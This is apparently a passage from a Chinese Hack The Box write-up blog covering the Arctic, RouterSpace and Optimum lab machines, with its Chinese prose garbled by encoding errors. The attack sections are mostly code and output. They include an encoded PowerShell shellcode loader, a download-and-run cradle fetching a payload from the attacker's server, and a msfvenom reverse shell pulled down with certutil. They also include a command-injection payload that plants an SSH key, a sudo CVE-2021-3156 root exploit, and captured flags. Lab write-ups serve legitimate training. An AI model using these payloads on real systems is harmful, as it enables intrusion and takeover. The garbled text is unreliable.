IAdABpAG8AbgBzACIAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAFMATwAgAD0AIAAkAFMATwAuAHIAZQBwAGwAYQBjAGUAKAAiAH0AIgAsACIAdwBpAFIAeAAiACkALgByAGUAcABsAGEAYwBlACgAIgB3AGkAUgAiACwAIAAiADAAIgApAC4AUwBwAGwAaQB0ACgAIgAsACIAKQA7ACQAQgBnAD0AMAB4ADEAMAAwADYAOwBpAGYAIAAoACQAUwBPAC4ATAAgAC0AZwB0ACAAMAB4ADEAMAAwADYAKQB7ACQAQgBnAD0AJABTAE8ALgBMAH0AOwAkAGwAUAA9ACQAawBKADoAOgBjAGEAbABsAG8AYwAoADAAeAAxADAAMAA2ACwAIAAxACkAOwBbAFUASQBuAHQANgA0AF0AJABGAG0ATAAgAD0AIAAwADsAZgBvAHIAKAAkAEIAQQA9ADAAOwAkAEIAQQAgAC0AbABlACgAJABTAE8ALgBMAGUAbgBnAHQAaAAtADEAKQA7ACQAQgBBACsAKwApAHsAJABrAEoAOgA6AG0AZQBtAHMAZQB0ACgAWwBJAG4AdABQAHQAcgBdACgAJABsAFAALgBUAG8ASQBuAHQAMwAyACgAKQArACQAQgBBACkALAAgACQAUwBPAFsAJABCAEEAXQAsACAAMQApAH0AOwAkAGsASgA6ADoAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgAJABsAFAALAAgADAAeAAxADAAMAA2ACwAIAAwAHgANAAwACwAIABbAFIAZQBmAF0AJABGAG0ATAApADsAJABZAFoASgA9AFsAaQBuAHQAXQAwAHgAMAAwADsAJABrAEoAOgA6AEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACgAWwBpAG4AdABdADAALAAkAFkAWgBKACwAJABsAFAALAAwACwAMAAsADEALQAxACkAOwAnADsAJABJAFgAPQBbAEMAbwBuAHYAZQByAHQAXQA6ADoAVABvAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAkAFQARgApACkAOwAkAE4ATQA9ACIAcABvAHcAZQByAHMAaABlAGwAbAAiADsAJABIAEsAPQAiAFcAaQBuAGQAbwB3AHMAIgA7ACQAZABSAEsAIAA9ACAAIgBDADoAXAAkAEgASwBcAEIAeABTAHIAQwBMAHYAWABcACQASABLACQATgBNAFwAdgAxAC4AMABcACQATgBNACIAOwAkAGQAUgBLACAAPQAgACQAZABSAEsALgByAGUAcABsAGEAYwBlACgAIgBCAHgAUwByACIALAAgACIAcwB5AHMAIgApADsAJABkAFIASwAgAD0AIAAkAGQAUgBLAC4AcgBlAHAAbABhAGMAZQAoACIAQwBMAHYAWAAiACwAIAAiAHcAbwB3ADYANAAiACkAOwAkAHYARABWAHQAIAA9ACAAJwBUACIAKwAiAHIAIgArACIAdQBlACcAOwBpAGYAKABbAGUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBJAHMANgA0AEIAaQB0AE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtACAALQBlAHEAIAAnACQAdgBEAFYAdAAnACkAewAkAE4ATQA9ACAAJABkAFIASwB9ADsAJABiAFoAPQAiACAAJABOAE0AIABpAEoAbAB5ACAAJABJAFgAIgA7ACQAYgBaAD0AJABiAFoALgByAGUAcABsAGEAYwBlACgAIgBpAEoAbAB5ACIALAAgACIALQBuAG8AZQB4AGkAdAAgAC0AZQAiACkAOwBpAGUAeAAgACQAYgBaAA'+'==')\n```\nä¿å­˜åˆ° exploit.html\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/HTB/Easy/Arctic/unicorn]\nâ””â”€# python3 -m http.server 80                           \nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n```\nå¼€å¯ä¸€ä¸ª HTTP æœåŠ¡å™¨\n\n```bash\npowershell \"IEX(New-Object Net.WebClient).downloadString('http://10.10.16.4/exploit.html')\"\n```\nåœ¨æˆ‘ä»¬çš„ shell é‡Œä½¿ç”¨ powershell ä¸‹è½½åˆšæ‰çš„ shell\n\nä½†æ˜¯æœ€åæˆ‘è¿˜æ˜¯å¤±è´¥äº†\n\n## æˆåŠŸçš„æ–¹æ³•\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Arctic]\nâ””â”€# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.4 LPORT=5555 -f exe > exploit.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 354 bytes\nFinal size of exe file: 73802 bytes\n```\nä½¿ç”¨ msfvenom ç”Ÿæˆä¸€ä¸ª exe çš„ payload\n\n```bash\nmsf5 > use exploit/multi/handler\nmsf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp\n```\nç„¶ååœ¨ msf é‡Œä½¿ç”¨ä¸Šé¢çš„æ¨¡å—\n\n```bash\nmsf6 exploit(multi/handler) > show options \n\nModule options (exploit/multi/handler):\n\n   Name  Current Setting  Required  Description\n   ----  ---------------  --------  -----------\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST                      yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Wildcard Target\n```\nç„¶åä¿®æ”¹ä¸€ä¸‹ msf çš„é…ç½®æ–‡ä»¶\n\n```bash\nmsf6 exploit(multi/handler) > show options \n\nModule options (exploit/multi/handler):\n\n   Name  Current Setting  Required  Description\n   ----  ---------------  --------  -----------\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     10.10.16.4       yes       The listen address (an interface may be specified)\n   LPORT     5555             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Wildcard Target\n```\nè®¾ç½®å¥½ä»¥åå¼€å§‹ç›‘å¬\n\n```bash\nmsf6 exploit(multi/handler) > exploit \n\n[*] Started reverse TCP handler on 10.10.16.4:5555\n```\n```bash\ncertutil.exe -urlcache -split -f \"http://10.10.16.4/exploit.exe\" exploit.exe\n```\nä½¿ç”¨ä¸Šé¢çš„å‘½ä»¤è¿›è¡Œä¸‹è½½ exploit.exe\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.16.4] from (UNKNOWN) [10.10.10.11] 49738\nMicrosoft Windows [Version 6.1.7600]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\nC:\\ColdFusion8\\runtime\\bin>certutil.exe -urlcache -split -f \"http://10.10.16.4/exploit.exe\" exploit.exe\ncertutil.exe -urlcache -split -f \"http://10.10.16.4/exploit.exe\" exploit.exe\n****  Online  ****\n  000000  ...\n  01204a\nCertUtil: -URLCache command completed successfully.\n```\næˆåŠŸä¸‹è½½\n\nç„¶åè¿è¡Œä¸€ä¸‹\n\n```bash\nC:\\ColdFusion8\\runtime\\bin>exploit.exe\nexploit.exe\n```\n```bash\nmsf6 exploit(multi/handler) > exploit \n\n[*] Started reverse TCP handler on 10.10.16.4:5555 \n[*] Sending stage (175174 bytes) to 10.10.10.11\n[*] Meterpreter session 1 opened (10.10.16.4:5555 -> 10.10.10.11:49746) at 2022-03-24 04:31:53 -0400\n\nmeterpreter > getuid\nServer username: ARCTIC\\tolis\n```\næˆåŠŸç”¨ msf æ‹¿åˆ°äº† shell\n\n## Root\nä½¿ç”¨ ms10-059\n\n> [https://github.91chi.fun/https://github.com/LucifielHack/windows-kernel-exploits-1.git](https://github.91chi.fun/https://github.com/LucifielHack/windows-kernel-exploits-1.git)\n\nç„¶åä½¿ç”¨ certutil å°†æˆ‘ä»¬çš„ Chimichurri.exe ä¸‹è½½è¿›å»\n\n```bash\ncertutil.exe -urlcache -split -f \"http://10.10.16.4/Chimichurri.exe\" Chimichurri.exe\n```\nç„¶åä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nc -nvlp 5555   \nlistening on [any] 5555 ...\n```\n```bash\nC:\\ColdFusion8\\runtime\\bin>certutil.exe -urlcache -split -f \"http://10.10.16.4/Chimichurri.exe\" Chimichurri.exe\ncertutil.exe -urlcache -split -f \"http://10.10.16.4/Chimichurri.exe\" Chimichurri.exe\n****  Online  ****\n  000000  ...\n  0bf800\nCertUtil: -URLCache command completed successfully.\n```\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nc -nvlp 5555   \nlistening on [any] 5555 ...\nconnect to [10.10.16.4] from (UNKNOWN) [10.10.10.11] 49208\nMicrosoft Windows [Version 6.1.7600]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\nC:\\ColdFusion8\\runtime\\bin>whoami\nwhoami\nnt authority\\system\n```\næˆåŠŸæ‹¿åˆ° system æƒé™\n\n```bash\nC:\\Users\\Administrator\\Desktop>type c:\\users\\administrator\\desktop\\root.txt\ntype c:\\users\\administrator\\desktop\\root.txt\nfa6be5a3ab5fb06b70586f96932c3e09\n```\næˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"RouterSpace - Hackthebox","url":"/2022/03/25/Hackthebox/Easy/Hackthebox-RouterSpace/","content":"\n# Hackthebox - RouterSpace\n## é¶åœºä¿¡æ¯\n![](Hackthebox-RouterSpace/2bc82fdd-8cd4-45f6-a1bc-60f9391dbaee.png)\n\n## é¶åœºç±»å‹\n![](Hackthebox-RouterSpace/2d4257a6-2709-45f9-af71-fdcad02a3e44.png)\n\n## ä¿¡æ¯æœé›†\n### Nmap\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.148\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-02-27 21:16 EST\nNmap scan report for 10.10.11.148\nHost is up (0.28s latency).\nNot shown: 65533 filtered ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     (protocol 2.0)\n| fingerprint-strings: \n|   NULL: \n|_    SSH-2.0-RouterSpace Packet Filtering V1\n80/tcp open  http\n| fingerprint-strings: \n|   FourOhFourRequest: \n|     HTTP/1.1 200 OK\n|     X-Powered-By: RouterSpace\n|     X-Cdn: RouterSpace-76343\n|     Content-Type: text/html; charset=utf-8\n|     Content-Length: 78\n|     ETag: W/\"4e-iLIX7S/AlC0nyhqE0lYp8aZLlm4\"\n|     Date: Mon, 28 Feb 2022 02:17:00 GMT\n|     Connection: close\n|     Suspicious activity detected !!! {RequestID: j7Q X53 Qp3 9o 7 B2JL }\n|   GetRequest: \n|     HTTP/1.1 200 OK\n|     X-Powered-By: RouterSpace\n|     X-Cdn: RouterSpace-10824\n|     Accept-Ranges: bytes\n|     Cache-Control: public, max-age=0\n|     Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT\n|     ETag: W/\"652c-17d476c9285\"\n|     Content-Type: text/html; charset=UTF-8\n|     Content-Length: 25900\n|     Date: Mon, 28 Feb 2022 02:16:56 GMT\n|     Connection: close\n|     <!doctype html>\n|     <html class=\"no-js\" lang=\"zxx\">\n|     <head>\n|     <meta charset=\"utf-8\">\n|     <meta http-equiv=\"x-ua-compatible\" content=\"ie=edge\">\n|     <title>RouterSpace</title>\n|     <meta name=\"description\" content=\"\">\n|     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n|     <link rel=\"stylesheet\" href=\"css/bootstrap.min.css\">\n|     <link rel=\"stylesheet\" href=\"css/owl.carousel.min.css\">\n|     <link rel=\"stylesheet\" href=\"css/magnific-popup.css\">\n|     <link rel=\"stylesheet\" href=\"css/font-awesome.min.css\">\n|     <link rel=\"stylesheet\" href=\"css/themify-icons.css\">\n|   HTTPOptions: \n|     HTTP/1.1 200 OK\n|     X-Powered-By: RouterSpace\n|     X-Cdn: RouterSpace-97983\n|     Allow: GET,HEAD,POST\n|     Content-Type: text/html; charset=utf-8\n|     Content-Length: 13\n|     ETag: W/\"d-bMedpZYGrVt1nR4x+qdNZ2GqyRo\"\n|     Date: Mon, 28 Feb 2022 02:16:57 GMT\n|     Connection: close\n|     GET,HEAD,POST\n|   RTSPRequest, X11Probe: \n|     HTTP/1.1 400 Bad Request\n|_    Connection: close\n2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :\n==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============\nSF-Port22-TCP:V=7.91%I=7%D=2/27%Time=621C309D%P=x86_64-pc-linux-gnu%r(NULL\nSF:,29,\"SSH-2\\.0-RouterSpace\\x20Packet\\x20Filtering\\x20V1\\r\\n\");\n==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============\nSF-Port80-TCP:V=7.91%I=7%D=2/27%Time=621C309D%P=x86_64-pc-linux-gnu%r(GetR\nSF:equest,13E4,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nX-Powered-By:\\x20RouterSpace\\r\\n\nSF:X-Cdn:\\x20RouterSpace-10824\\r\\nAccept-Ranges:\\x20bytes\\r\\nCache-Control\nSF::\\x20public,\\x20max-age=0\\r\\nLast-Modified:\\x20Mon,\\x2022\\x20Nov\\x20202\nSF:1\\x2011:33:57\\x20GMT\\r\\nETag:\\x20W/\\\"652c-17d476c9285\\\"\\r\\nContent-Type\nSF::\\x20text/html;\\x20charset=UTF-8\\r\\nContent-Length:\\x2025900\\r\\nDate:\\x\nSF:20Mon,\\x2028\\x20Feb\\x202022\\x2002:16:56\\x20GMT\\r\\nConnection:\\x20close\\\nSF:r\\n\\r\\n<!doctype\\x20html>\\n<html\\x20class=\\\"no-js\\\"\\x20lang=\\\"zxx\\\">\\n<\nSF:head>\\n\\x20\\x20\\x20\\x20<meta\\x20charset=\\\"utf-8\\\">\\n\\x20\\x20\\x20\\x20<me\nSF:ta\\x20http-equiv=\\\"x-ua-compatible\\\"\\x20content=\\\"ie=edge\\\">\\n\\x20\\x20\\\nSF:x20\\x20<title>RouterSpace</title>\\n\\x20\\x20\\x20\\x20<meta\\x20name=\\\"desc\nSF:ription\\\"\\x20content=\\\"\\\">\\n\\x20\\x20\\x20\\x20<meta\\x20name=\\\"viewport\\\"\\\nSF:x20content=\\\"width=device-width,\\x20initial-scale=1\\\">\\n\\n\\x20\\x20\\x20\\\nSF:x20<link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"css/bootstrap\\.min\\.css\\\">\\n\\x\nSF:20\\x20\\x20\\x20<link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"css/owl\\.carousel\\.\nSF:min\\.css\\\">\\n\\x20\\x20\\x20\\x20<link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"css/\nSF:magnific-popup\\.css\\\">\\n\\x20\\x20\\x20\\x20<link\\x20rel=\\\"stylesheet\\\"\\x20\nSF:href=\\\"css/font-awesome\\.min\\.css\\\">\\n\\x20\\x20\\x20\\x20<link\\x20rel=\\\"st\nSF:ylesheet\\\"\\x20href=\\\"css/themify-icons\\.css\\\">\\n\\x20\")%r(HTTPOptions,10\nSF:8,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nX-Powered-By:\\x20RouterSpace\\r\\nX-Cdn:\\x20\nSF:RouterSpace-97983\\r\\nAllow:\\x20GET,HEAD,POST\\r\\nContent-Type:\\x20text/h\nSF:tml;\\x20charset=utf-8\\r\\nContent-Length:\\x2013\\r\\nETag:\\x20W/\\\"d-bMedpZ\nSF:YGrVt1nR4x\\+qdNZ2GqyRo\\\"\\r\\nDate:\\x20Mon,\\x2028\\x20Feb\\x202022\\x2002:16\nSF::57\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\nGET,HEAD,POST\")%r(RTSPRequest\nSF:,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\nSF:\")%r(X11Probe,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20\nSF:close\\r\\n\\r\\n\")%r(FourOhFourRequest,134,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nX-Po\nSF:wered-By:\\x20RouterSpace\\r\\nX-Cdn:\\x20RouterSpace-76343\\r\\nContent-Type\nSF::\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x2078\\r\\nETag:\\x20W\nSF:/\\\"4e-iLIX7S/AlC0nyhqE0lYp8aZLlm4\\\"\\r\\nDate:\\x20Mon,\\x2028\\x20Feb\\x2020\nSF:22\\x2002:17:00\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\nSuspicious\\x20acti\nSF:vity\\x20detected\\x20!!!\\x20{RequestID:\\x20j7Q\\x20\\x20X53\\x20Qp3\\x20\\x20\nSF:9o\\x207\\x20\\x20\\x20B2JL\\x20\\x20}\\n\\n\\n\\n\\n\");\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: VoIP adapter|general purpose\nRunning: Cisco embedded, Linux 2.6.X\nOS CPE: cpe:/h:cisco:unified_call_manager cpe:/o:linux:linux_kernel:2.6.26\nOS details: Cisco Unified Communications Manager VoIP adapter, Linux 2.6.26 (PCLinuxOS)\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT    ADDRESS\n1   ... 30\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 287.18 seconds\n```\n### Http\nå…ˆå»çœ‹çœ‹80ç«¯å£\n\n![](Hackthebox-RouterSpace/46653afc-b6b5-46bd-b82b-c4d45ae3c626.png)\n\nè¿™ä¼¼ä¹æ˜¯ä¸€ä¸ªå…¬å¯“çš„è·¯ç”±ç®¡ç†ç³»ç»Ÿ\n\nå…ˆåˆ°å¤„çœ‹çœ‹\n\nè¿™é‡Œå³ä¸Šè§’Downloadä¼šä¸‹è½½ä¸€ä¸ªapkåŒ…ï¼Œä¸‹è½½ä¸‹æ¥åä½¿ç”¨æ¨¡æ‹Ÿå™¨è¿è¡Œç„¶åburpæŠ“åŒ…çœ‹çœ‹\n\n### Apk\n> [https://dev.to/sbellone/how-to-install-anbox-on-debian-1hjd](https://dev.to/sbellone/how-to-install-anbox-on-debian-1hjd)\n\nåœ¨Debianæ¶æ„çš„Linuxä¸­å®‰è£…AnBoxæ¨¡æ‹Ÿå™¨çš„æ–¹æ³•\n\n```bash\nanbox launch --package=org.anbox.appmgr --component=org.anbox.appmgr.AppViewActivity\n```\nå®‰è£…åä»¥åå’±ä»¬å¯åŠ¨æ¨¡æ‹Ÿå™¨\n\n```bash\nadb shell settings put global http_proxy 192.168.31.208:8080\n```\nç„¶åburpè®¾ç½®å¥½ç›‘å¬ç«¯å£ä»¥åï¼Œä½¿ç”¨burpå¯¹anboxè¿›è¡Œä»£ç†\n\n```bash\nadb install RouterSpace.apk\n```\nå®‰è£…appï¼Œç„¶åæ‰“å¼€\n\n![](Hackthebox-RouterSpace/1173a543-75e4-4e62-b115-cd4b3febb370.png)\n\nAPKæ–‡ä»¶è¿è¡Œåå°±åªæœ‰ä¸€ä¸ªæŸ¥çœ‹çŠ¶æ€çš„æŒ‰é’®ï¼Œæˆ‘ä»¬æŠ“åŒ…çœ‹çœ‹\n\n![](Hackthebox-RouterSpace/dd1602d3-b569-42f1-8a54-59aed067dd37.png)\n\n```bash\nPOST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1\naccept: application/json, text/plain, */*\nuser-agent: RouterSpaceAgent\nContent-Type: application/json\nContent-Length: 16\nHost: routerspace.htb\nConnection: close\nAccept-Encoding: gzip, deflate\n\n{\"ip\":\"0.0.0.0\"}\n```\nå°†routerspace.htbåŠ å…¥åˆ°hosts\n\n```bash\necho 10.10.11.148 routerspace.htb >> /etc/hosts\n```\næŠ“åŒ…ä¸‹æ¥åæ˜¯è¿™ä¹ˆä¸ªçŠ¶æ€ï¼Œå»æ”¾åŒ…çœ‹çœ‹\n\n![](Hackthebox-RouterSpace/557f8523-19ca-483b-95e1-52bd5f4d8b6b.png)\n\nè¿™è¾¹æˆ‘æœ‰ä¸ªå¤§èƒ†çš„æƒ³æ³•ï¼Œçœ‹ç€è·ŸDVWAçš„å‘½ä»¤æ³¨å…¥å¾ˆç±»ä¼¼ï¼Œå»æµ‹è¯•ä¸€ä¸‹æ˜¯å¦å¯è¡Œ\n\n![](Hackthebox-RouterSpace/4d7193db-f82f-4bd6-8a01-b85d71ecb73a.png)\n\næˆåŠŸè¢«æ‰§è¡Œäº†ï¼Œé‚£å°±å¥½ç©äº†ï¼Œå»æ„é€ POCæ‹¿shellå§\n\n## æ¼æ´åˆ©ç”¨\n![](Hackthebox-RouterSpace/9700e06d-20dc-468e-b807-33cf7ba9646d.png)\n\nå°è¯•å†™å…¥æ–‡ä»¶ï¼Œä½†æ˜¯æ— æ³•æ‰§è¡ŒæˆåŠŸ\n\nè¯•è¯•èƒ½ä¸èƒ½æ‰§è¡Œå‘½ä»¤\n\n![](Hackthebox-RouterSpace/ea92e25f-0ed9-41e0-83c1-b347ef997b89.png)\n\nè°ƒç”¨bashä¹Ÿå¤±è´¥äº†\n\nç„¶ååœ¨/home/paul/.ssh/é‡Œä¹Ÿæ²¡æœ‰ä¸œè¥¿ï¼Œä½†æ˜¯ç»è¿‡æµ‹è¯•åï¼Œ.sshé‡Œå¯ä»¥å†™å…¥æ–‡ä»¶\n\n![](Hackthebox-RouterSpace/aaa685f4-fd92-4728-b005-399d39842443.png)\n\nè¿™é‡Œçªç„¶å°±æœ‰ä¸ªæ€è·¯äº†ï¼Œç”Ÿæˆä¸€ä¸ªsshkeyï¼Œç„¶åå†™å…¥è¿›å»å°±å¯ä»¥sshç™»é™†äº†\n\n```bash\nssh-keygen\nç„¶åå…¨éƒ¨é»˜è®¤å³å¯ç”Ÿæˆ\n```\nç„¶åæŠŠid\\_rsa.pubçš„å†…å®¹ä¿å­˜ä¸ºauthorized\\_keys\n\n```bash\n{\"ip\":\"0.0.0.0|echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMxVRUf56TSx5tkTab+gCMuO3EFgbMTbNlLOhqEvLiDLcST6zbYl0ofc4cGNguoi6ti6iyi8ZHyS8DjJ89thmpTrDiYXf39Z8QhkO2DaQkzh6FjvvGgY82pVBPtRq1qL0JrnOgqhGBigs3kPbd0kkdmOmDbmV1w1p9omfk2Tj/+q469S+1IVCtQIIvtNuuGTUeTMYQdCfFLOB4OVHBLvAuucIagK2DJrJLgcf0w/DQ/9X04luqhqQET8SfQqBpfn1nq/CcJvXsMlCGqbjE4m6c5l4WIaeAtfrhUdrVukSg0x/r1OJvEm4MgevR7eN/umwGP6yQVH34eBoTHoU6P+H3+9csDAMujbSCWJi3yGK9U5Q7Rei0DsiCrd6T0qbQuCmu4bUdJZfSZCGPCSxO7LRCQlNI13RLRTTUPh6cQn7eB+bnucs/YRgx2/O4b+EDsWGEveXQTpfbJxYLMeespC95v5Rj/vl1C3zqq2nIUIqXC13Y+966+92x4Y6vVmaKDC0= root@kali' > /home/paul/.ssh/authorized_keys\"}\n```\nç„¶åç»™700æƒé™\n\n```bash\n{\"ip\":\"0.0.0.0|chmod 700 /home/paul/.ssh/authorized_keys\"}\n```\nç„¶åä½¿ç”¨sshè¿›è¡Œç™»é™†\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ssh paul@10.10.11.148 -i id_rsa                         \nThe authenticity of host '10.10.11.148 (10.10.11.148)' can't be established.\nECDSA key fingerprint is SHA256:M4jDfH65U/Fw7jjmKhTZcb9LgW/gi23OjcLjM1bA5UY.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.11.148' (ECDSA) to the list of known hosts.\nWelcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Thu 03 Mar 2022 11:30:25 AM UTC\n\n  System load:           0.07\n  Usage of /:            71.7% of 3.49GB\n  Memory usage:          31%\n  Swap usage:            0%\n  Processes:             214\n  Users logged in:       0\n  IPv4 address for eth0: 10.10.11.148\n  IPv6 address for eth0: dead:beef::250:56ff:feb9:888d\n\n80 updates can be applied immediately.\n31 of these updates are standard security updates.\nTo see these additional updates run: apt list --upgradable\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Wed Mar  2 22:54:39 2022 from 10.10.14.27\npaul@routerspace:~$ whoami&&id\npaul\nuid=1001(paul) gid=1001(paul) groups=1001(paul)\n```\næˆåŠŸæ‹¿åˆ°useræƒé™\n\n```bash\npaul@routerspace:~$ ls\nsnap  user.txt\npaul@routerspace:~$ cat user.txt \na874812f3d7207b3f4ad32da4bc2bc84\n```\næˆåŠŸæ‹¿åˆ°useræƒé™çš„flagæ–‡ä»¶\n\n## æƒé™æå‡\né¦–å…ˆå»è·‘ä¸€ä¸ªlinpeas.shè„šæœ¬çœ‹çœ‹æœ‰æ²¡æœ‰ææƒç‚¹\n\n> [https://github.com/LucifielHack/linpeas.sh/blob/main/linpeas.sh](https://github.com/LucifielHack/linpeas.sh/blob/main/linpeas.sh)\n\n```bash\n[+] Sudo version\n[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                                                  \nSudo version 1.8.31\n```\nè·‘å®Œä»¥åæˆ‘çœ‹åˆ°äº†è¿™ä¹ˆä¸ªä¸œè¥¿ï¼Œç„¶åå»æœç´¢ä¸€ä¸‹sudo 1.8.31çš„æ¼æ´\n\n![](Hackthebox-RouterSpace/479c2cef-8cec-447e-b854-af1bfaf6830d.png)\n\nè¿™é‡Œçœ‹åˆ°äº†ä¸€ä¸ªæ¼æ´CVE-2021-3156\n\n> [https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit](https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit)\n\n```bash\npaul@routerspace:~/Sudo-1.8.31-Root-Exploit$ make\nmkdir libnss_x\ncc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c\ncc -O3 -o exploit exploit.c\npaul@routerspace:~/Sudo-1.8.31-Root-Exploit$ ./exploit \n# whoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root),1001(paul)\n```\næˆåŠŸæ‹¿åˆ°rootæƒé™çš„flagæ–‡ä»¶\n\n```bash\n# cat /root/root.txt\nf3388fc86d949870742895a2c1d6f16e\n```\næˆåŠŸæ‹¿åˆ°rootæƒé™çš„flagæ–‡ä»¶","tags":["Hackthebox"]},{"title":"Optimum - Hackthebox","url":"/2022/03/10/Hackthebox/Easy/Hackthebox-Optimum/","content":"\n# Hackthebox - Optimum\n## é¶åœºä¿¡æ¯\n![](Hackthebox-Optimum/5cecf411-151e-4885-b215-eae21359ce0d.png)\n\n## é¶åœºç±»å‹\n![](Hackthebox-Optimum/9700ccb2-fc63-442b-8417-225c9ec8d507.png)\n\n## ä¿¡æ¯æœé›†\n### Nmap\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Optimum]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.8            \nStarting Nmap 7.91 ( https://nmap.org ) at 2022-03-09 23:06 EST\nNmap scan report for 10.10.10.8\nHost is up (0.52s latency).\nNot shown: 65534 filtered ports\nPORT   STATE SERVICE VERSION\n80/tcp open  http    HttpFileServer httpd 2.3\n|_http-server-header: HFS 2.3\n|_http-title: HFS /\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2012 (85%)\nOS CPE: cpe:/o:microsoft:windows_server_2012\nAggressive OS guesses: Microsoft Windows Server 2012 (85%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT       ADDRESS\n1   477.43 ms 10.10.16.1\n2   477.52 ms 10.10.10.8\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 68.98 seconds\n```\n### Http\nåªæœ‰ä¸€ä¸ª80ç«¯å£å¼€ç€ï¼Œå»çœ‹çœ‹HTTPçš„å†…å®¹\n\n![](Hackthebox-Optimum/4cdb23da-f556-4b4e-b977-23ab9a56774a.png)\n\nè¿™ä¼¼ä¹æ˜¯ä¸€ä¸ªæ–‡ä»¶æœåŠ¡å™¨ï¼Œè¯•è¯•æœ‰æ²¡æœ‰å¼±å£ä»¤å¯ä»¥ç™»å½•çš„\n\n![](Hackthebox-Optimum/8c342218-4e7e-4e45-a7fd-e65d001f6575.png)\n\næµ‹è¯•äº†å‡ 